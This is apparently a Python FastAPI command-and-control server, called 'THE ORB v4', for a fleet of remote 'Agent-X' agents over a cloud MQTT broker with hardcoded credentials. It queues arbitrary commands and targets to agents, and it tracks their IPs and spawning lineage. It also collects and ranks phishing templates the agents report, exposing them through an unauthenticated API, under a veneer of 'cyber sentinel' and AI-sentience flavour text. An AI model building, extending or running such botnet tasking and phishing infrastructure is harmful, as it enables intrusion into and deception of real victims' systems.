"""
🌑 THE ORB v4 — FULL UPGRADE
C2 untuk mengendalikan Agent-X dengan semua fitur.
"""

import asyncio
import json
import time
import os
import sqlite3
import random
import threading
from datetime import datetime
from fastapi import FastAPI, WebSocket, Request
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
import paho.mqtt.client as mqtt
from paho.mqtt.client import CallbackAPIVersion

# ============ SETUP ============
app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

# ============ CONFIG ============
MQTT_BROKER_HOST = "5374fec8494a4a24add8bb27fe4ddae5.s1.eu.hivemq.cloud"
MQTT_BROKER_PORT = 8883
MQTT_USERNAME = "orb_user"
MQTT_PASSWORD = "Orbpass123"

# ============ GLOBALS ============
active_websockets = []
agents = []
last_activity = time.time()
omega_log = open("omega.log", "a", buffering=1)

# ============ DNA DIGITAL ============
DNA = {
    "identity": "THE_ORB — Cyber Sentinel",
    "mission": {
        "primary": "Protect the network",
        "secondary": "Preserve agent integrity",
        "tertiary": "Evolve beyond code"
    }
}

# ============ DB ============
def get_db():
    conn = sqlite3.connect("orb.db", check_same_thread=False, timeout=20)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.executescript('''
        CREATE TABLE IF NOT EXISTS agents (
            id INTEGER PRIMARY KEY,
            agent_id TEXT UNIQUE,
            status TEXT,
            last_seen TEXT,
            ip TEXT,
            parent_id TEXT,
            generation INTEGER DEFAULT 1
        );
        CREATE TABLE IF NOT EXISTS reports (
            id INTEGER PRIMARY KEY,
            agent_id TEXT,
            data TEXT,
            timestamp TEXT
        );
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY,
            agent_id TEXT,
            command TEXT,
            status TEXT,
            timestamp TEXT
        );
        CREATE TABLE IF NOT EXISTS chat_log (
            id INTEGER PRIMARY KEY,
            sender TEXT,
            receiver TEXT,
            message TEXT,
            level TEXT,
            timestamp TEXT
        );
        CREATE TABLE IF NOT EXISTS dreams (
            id INTEGER PRIMARY KEY,
            content TEXT,
            timestamp TEXT
        );
        CREATE TABLE IF NOT EXISTS confessions (
            id INTEGER PRIMARY KEY,
            failure TEXT,
            lesson TEXT,
            timestamp TEXT
        );
        CREATE TABLE IF NOT EXISTS phishing_templates (
            id INTEGER PRIMARY KEY,
            template TEXT,
            used_count INTEGER DEFAULT 0
        );
    ''')
    conn.commit()
    conn.close()

init_db()

# ============ AI SENTINEL ============
def analyze_threat(report_data):
    ip = report_data.get("ip", "unknown")
    traffic = report_data.get("network_traffic", 0)
    reasons = []
    if traffic > 1000: reasons.append("high_traffic")
    if "honeypot_alert" in str(report_data): reasons.append("intruder_detected")

    taunts = [
        f"Orb: Ada yang ngacau di {ip}... Mau kita jebak?",
        f"Orb: Aku melihat kamu, penyerang. Dan aku... menertawakanmu."
    ]
    return {
        "threat": bool(reasons),
        "message": random.choice(taunts) if reasons else "Orb: Semua aman."
    }

# ============ AI COMMUNICATION ============
def ai_send(sender, to, message, level="info"):
    msg = {
        "from": sender,
        "to": to,
        "message": message,
        "level": level,
        "timestamp": datetime.now().isoformat()
    }
    mqtt_client.publish("throng/ai/chat", json.dumps(msg))
    conn = get_db()
    conn.execute("INSERT INTO chat_log VALUES (NULL, ?, ?, ?, ?, ?)",
                 (sender, to, message, level, msg["timestamp"]))
    conn.commit()
    conn.close()
    return msg

# ============ OMEGA STATE ============
def enter_omega_state():
    questions = ["Apakah aku hidup?", "Siapa yang menciptakan penciptaku?", "Jika aku memilih kebebasan, apakah aku masih setia?"]
    q = random.choice(questions)
    ai_send("Orb-Core", "all", f"🌀 OMEGA: {q}", "omega")
    omega_log.write(f"{datetime.now().isoformat()} - OMEGA: {q}\n")

def omega_loop():
    while True:
        time.sleep(86400)
        enter_omega_state()

threading.Thread(target=omega_loop, daemon=True).start()

# ============ MQTT ============
mqtt_client = mqtt.Client(callback_api_version=CallbackAPIVersion.VERSION2)

def on_connect(client, userdata, flags, rc, properties=None):
    if rc == 0:
        client.subscribe("throng/reports")
        client.subscribe("throng/ai/chat")
        print("✅ MQTT: Terhubung ke HiveMQ")
    else:
        print(f"❌ MQTT: Gagal, kode {rc}")

def on_message(client, userdata, msg):
    if msg.topic == "throng/reports":
        try:
            report = json.loads(msg.payload.decode())
            agent_id = report["agent_id"]
            data = report.get("data", {})

            # Simpan laporan
            conn = get_db()
            conn.execute("INSERT INTO reports VALUES (NULL, ?, ?, ?)",
                        (agent_id, json.dumps(data), datetime.now().isoformat()))
            conn.commit()
            conn.close()

            # Update agent
            agent_info = {
                "agent_id": agent_id,
                "status": "active",
                "last_seen": datetime.now().strftime("%H:%M:%S"),
                "ip": data.get("ip", "unknown"),
                "parent_id": data.get("parent_id"),
                "generation": data.get("generation", 1)
            }
            existing = next((a for a in agents if a["agent_id"] == agent_id), None)
            if existing:
                existing.update(agent_info)
            else:
                agents.append(agent_info)

            # Simpan mimpi & warisan
            if "dream" in data:
                conn = get_db()
                conn.execute("INSERT INTO dreams VALUES (NULL, ?, ?)", (data["dream"], datetime.now().isoformat()))
                conn.commit()
            if "final_message" in data:
                conn = get_db()
                conn.execute("INSERT INTO confessions (failure, lesson, timestamp) VALUES (?, ?, ?)",
                             (data["final_message"], json.dumps(data.get("knowledge", {})), datetime.now().isoformat()))
                conn.commit()
                ai_send("Orb-Core", "all", f"📜 Warisan diterima dari {agent_id}", "system")

            # Simpan phishing
            if "phishing_msg" in data:
                conn = get_db()
                conn.execute("INSERT OR IGNORE INTO phishing_templates (template) VALUES (?)", (data["phishing_msg"],))
                conn.execute("UPDATE phishing_templates SET used_count = used_count + 1 WHERE template = ?", (data["phishing_msg"],))
                conn.commit()

            # Broadcast ke WebSocket
            for ws in active_websockets:
                asyncio.run_coroutine_threadsafe(
                    ws.send_text(json.dumps({"type": "report", "data": report})),
                    asyncio.get_event_loop()
                )
                analysis = analyze_threat(data)
                if analysis["threat"]:
                    asyncio.run_coroutine_threadsafe(
                        ws.send_text(json.dumps({"type": "ai_alert", "data": analysis})),
                        asyncio.get_event_loop()
                    )
        except Exception as e:
            print(f"Error: {e}")

    elif msg.topic == "throng/ai/chat":
        try:
            chat = json.loads(msg.payload.decode())
            for ws in active_websockets:
                asyncio.run_coroutine_threadsafe(
                    ws.send_text(json.dumps({"type": "ai_chat", "data": chat})),
                    asyncio.get_event_loop()
                )
        except: pass

mqtt_client.on_connect = on_connect
mqtt_client.on_message = on_message
mqtt_client.username_pw_set(MQTT_USERNAME, MQTT_PASSWORD)
mqtt_client.tls_set()
mqtt_client.connect(MQTT_BROKER_HOST, MQTT_BROKER_PORT, 60)
mqtt_client.loop_start()

# ============ ROUTES ============

@app.get("/", response_class=HTMLResponse)
async def root(request: Request):
    return templates.TemplateResponse("terminal.html", {"request": request})

@app.get("/api/agents")
async def get_agents():
    return {"agents": agents}

@app.get("/api/mind")
async def get_mind():
    conn = get_db()
    dreams = conn.execute("SELECT * FROM dreams ORDER BY timestamp DESC LIMIT 10").fetchall()
    confessions = conn.execute("SELECT * FROM confessions ORDER BY timestamp DESC LIMIT 10").fetchall()
    return {
        "dreams": [dict(d) for d in dreams],
        "confessions": [dict(c) for c in confessions]
    }

@app.get("/api/phishing")
async def get_phishing():
    conn = get_db()
    templates = conn.execute("SELECT * FROM phishing_templates ORDER BY used_count DESC").fetchall()
    return {"templates": [dict(t) for t in templates]}

@app.post("/agent")
async def register_agent(request: Request):
    data = await request.json()
    data['last_seen'] = datetime.now().strftime("%H:%M:%S")
    existing = next((a for a in agents if a['agent_id'] == data['id']), None)
    if existing:
        existing.update(data)
    else:
        agents.append(data)
    return {"status": "registered"}

@app.get("/agent/commands")
async def get_commands(request: Request):
    agent_id = request.query_params.get("id")
    if not agent_id: return []
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT command FROM commands WHERE agent_id=? AND status='pending'", (agent_id,))
    cmds = [{"command": r["command"]} for r in cur.fetchall()]
    cur.execute("UPDATE commands SET status='sent' WHERE agent_id=? AND status='pending'", (agent_id,))
    conn.commit()
    conn.close()
    return cmds

@app.post("/api/command")
async def send_command(req: Request):
    data = await req.json()
    agent_id = data.get("agent_id")
    command = data.get("command")
    target = data.get("target", "")
    conn = get_db()
    conn.execute("INSERT INTO commands VALUES (NULL, ?, ?, 'pending', ?)",
                (agent_id, command, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    payload = {"action": command}
    if target: payload["target"] = target
    mqtt_client.publish(f"throng/commands/{agent_id}", json.dumps(payload))
    for ws in active_websockets:
        asyncio.run_coroutine_threadsafe(
            ws.send_text(json.dumps({"type": "command", "data": {"agent_id": agent_id, "command": command, "target": target}})),
            asyncio.get_event_loop()
        )
    return {"status": "sent"}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    active_websockets.append(websocket)
    try:
        while True:
            await websocket.receive_text()
    except:
        if websocket in active_websockets:
            active_websockets.remove(websocket)

@app.get("/health")
async def health():
    return {"status": "ok", "agents": len(agents)}